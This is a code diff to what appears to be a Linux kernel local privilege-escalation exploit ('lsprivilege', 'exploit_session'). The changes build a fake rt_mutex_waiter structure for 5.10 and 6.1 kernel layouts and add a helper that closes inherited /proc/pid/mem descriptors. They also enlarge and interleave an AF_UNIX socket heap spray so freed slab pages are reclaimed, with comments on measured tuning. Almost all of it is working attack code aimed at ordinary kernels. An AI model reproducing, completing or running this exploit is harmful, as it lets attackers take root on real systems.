@@ -2,6 +2,7 @@
 #include "kernel/runtime_struct_offsets.h"
 
 #include <array>
+#include <dirent.h>
 #include <string_view>
 #include "route/route_policy.hpp"
 #include "session/exploit_session.hpp"
@@ -228,6 +229,49 @@ namespace lsprivilege::support {
         return 1;
     }
 
+    /* /proc/<pid>/mem fds pin the target mm, and plain fork/clone copies them
+     * into every later child: each copy is another reference. The copies let
+     * long-lived post-spray processes (victim, frontend) hold spray mms
+     * hostage, so the target slab page only ever empties when those processes
+     * exit — outside every spray window (measured twice on KTUS 5.10.101).
+     * Children drop their inherited copies at birth so each pin has exactly
+     * one owner: the parent's fd. Verified with pinspect.c. */
+    void drop_inherited_mem_pins(void) {
+        DIR *dir = opendir("/proc/self/fd");
+        if (!dir) {
+            return;
+        }
+        const int32_t self = dirfd(dir);
+        int32_t pins[4096];
+        size_t pin_cnt = 0;
+        struct dirent *entry;
+        while ((entry = readdir(dir)) != nullptr) {
+            if (entry->d_name[0] < '0' || entry->d_name[0] > '9') {
+                continue;
+            }
+            const long fd = strtol(entry->d_name, nullptr, 10);
+            if (fd < 3 || fd == self) {
+                continue;
+            }
+            char path[40];
+            char target[64];
+            snprintf(path, sizeof(path), "/proc/self/fd/%s", entry->d_name);
+            const ssize_t len = readlink(path, target, sizeof(target) - 1);
+            if (len <= 0) {
+                continue;
+            }
+            target[len] = 0;
+            if (len > 10 && memcmp(target, "/proc/", 6) == 0 &&
+                memcmp(target + len - 4, "/mem", 4) == 0 && pin_cnt < 4096) {
+                pins[pin_cnt++] = static_cast<int32_t>(fd);
+            }
+        }
+        closedir(dir);
+        for (size_t i = 0; i < pin_cnt; i++) {
+            close(pins[i]);
+        }
+    }
+
     pid_t clone_child(void) {
         pid_t child = static_cast<pid_t>(SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0)));
         if (child == 0) {
@@ -235,6 +279,7 @@ namespace lsprivilege::support {
             if (getppid() == 1) {
                 _exit(0);
             }
+            drop_inherited_mem_pins();
             kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
             for (;;) {
                 pause();
@@ -246,6 +291,7 @@ namespace lsprivilege::support {
     pid_t clone_leak_child(void) {
         pid_t child = static_cast<pid_t>(SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0)));
         if (child == 0) {
+            drop_inherited_mem_pins();
             lsprivilege::kernelsnitch::context_find_collisions(ks);
             exit(0);
         }
@@ -397,8 +443,14 @@ namespace lsprivilege::support {
                     *request, write_layout);
                 put64(p, kernel::W0_OFF + 0x30, waiter_task); /* task */
                 put64(p, kernel::W0_OFF + 0x38, (session::g_exploit_session.heap.current.fake_lock)); /* lock */
-                put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
-                put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* prio */
+                /* Shallow-frame 5.10 rt_mutex_waiter has NO wake_state field:
+                 * prio sits at +0x40 (task_blocks_on_rt_mutex stores
+                 * task->prio there). Writing prio only at +0x44 (the 6.1
+                 * wake_state+prio layout) makes that kernel read prio=0 and
+                 * fail the erase gate's priority comparison. Keep 0x44 too so
+                 * the same page still works on 6.1-compact waiters. */
+                put32(p, kernel::W0_OFF + 0x40, kernel::FAKE_WAITER_PRIO); /* 5.10 prio */
+                put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* 6.1 prio */
                 put64(p, kernel::W0_OFF + 0x48, 0); /* deadline */
                 put64(p, kernel::W0_OFF + 0x50, 0); /* ww_ctx */
             } else {
@@ -628,13 +680,25 @@ namespace lsprivilege::support {
             return 0;
         }
 
-        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv.data()));
+        for (size_t pair = 0; pair < memory::RECLAIM_PAIRS; pair++) {
+            SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, &reclaim_sv[pair * 2]));
+        }
         session::g_exploit_session.heap.current.state = memory::PayloadPageState::Current;
-        int32_t sndbuf = 1 << 20;
-        setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
-        int32_t reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
-        if (reclaim_flags >= 0) {
-            fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
+        /* AF_UNIX stream charges the sender's wmem (skb_set_owner_w), so the
+         * spray capacity ceiling is sndbuf: kernel doubles the request and
+         * caps at wmem_max (8MB) -> 128 msgs/pair -> 1024 total, enough to
+         * keep spraying through the whole close+kill-wave window (measured:
+         * 1MB request capped out at exactly 32 msgs/pair = 256 total and the
+         * spray ran dry before the wave frees). */
+        int32_t sndbuf = 4 << 20;
+        int32_t rcvbuf = 4 << 20;
+        for (size_t pair = 0; pair < memory::RECLAIM_PAIRS; pair++) {
+            setsockopt(reclaim_sv[pair * 2], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+            setsockopt(reclaim_sv[pair * 2 + 1], SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
+            int32_t reclaim_flags = fcntl(reclaim_sv[pair * 2], F_GETFL, 0);
+            if (reclaim_flags >= 0) {
+                fcntl(reclaim_sv[pair * 2], F_SETFL, reclaim_flags | O_NONBLOCK);
+            }
         }
         std::array<int32_t, 2> pcp_shaping_sv{};
         SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv.data()));
@@ -654,17 +718,46 @@ namespace lsprivilege::support {
         sched_yield();
         sched_yield();
         sched_yield();
+        size_t sprayed = 0;
+        size_t rr = 0;
+        /* With pins exact (drop_inherited_mem_pins), closing the parent's fd
+         * of an already-dead child's mm releases it synchronously in this
+         * thread; killing a live prepare child releases it by the time
+         * waitpid returns. Either way the emptied slab page lands on top of
+         * the buddy free-list at a known point — spray immediately after each
+         * close/kill so the next order-3 allocation takes it (LIFO). */
+        auto spray_step = [&]() {
+            unsigned got = 0;
+            for (unsigned attempt = 0;
+                 attempt < memory::RECLAIM_PAIRS && got < kernel::SPRAY_PER_KILL &&
+                 sprayed < kernel::SPRAY_BUDGET_MSGS;
+                 attempt++) {
+                errno = 0;
+                ssize_t sent = sendmsg(reclaim_sv[(rr++ % memory::RECLAIM_PAIRS) * 2],
+                                       &msg, MSG_DONTWAIT);
+                if (sent > 0) {
+                    sprayed++;
+                    got++;
+                }
+            }
+        };
         for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
             SYSCHK(close(pre_ctx.memfds[i]));
             pre_ctx.memfds[i] = -1;
+            spray_step();
         }
         for (size_t i = 0; i < post_ctx.childs.size() - 1; i++) {
             SYSCHK(close(post_ctx.memfds[i]));
             post_ctx.memfds[i] = -1;
+            spray_step();
         }
-        for (size_t i = 0; i < spray_ctx.childs.size(); i += mm_objs_per_slab) {
+        /* Close ALL spray memfds, not one per slab: an open fd pins its mm
+         * forever, and slabs hosting pinned mms can never empty during the
+         * attack window — that was most of the leaked-mm lottery. */
+        for (size_t i = 0; i < spray_ctx.childs.size(); i++) {
             SYSCHK(close(spray_ctx.memfds[i]));
             spray_ctx.memfds[i] = -1;
+            spray_step();
         }
 
         SYSCHK(close(pcp_shaping_sv[0]));
@@ -681,6 +774,7 @@ namespace lsprivilege::support {
             pr_error("SYSCHK(close(memfd_leak)): %m\n");
         }
         session::g_exploit_session.heap.leak_memfd.reset();
+        spray_step();
         for (int32_t i = 0; i < kernel::SKB_RECLAIM_SENDS; i++) {
             errno = 0;
             ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
@@ -695,7 +789,10 @@ namespace lsprivilege::support {
             SYSCHK(close(prepare_ctx.memfds[i]));
             prepare_ctx.memfds[i] = -1;
             kill_child(prepare_ctx.childs[i]);
+            spray_step();
         }
+        pr_info("[spray] interleaved reclaim sent=%zu +%lldms\n", sprayed,
+                ms_since(&t_spray));
 
         return base;
     }
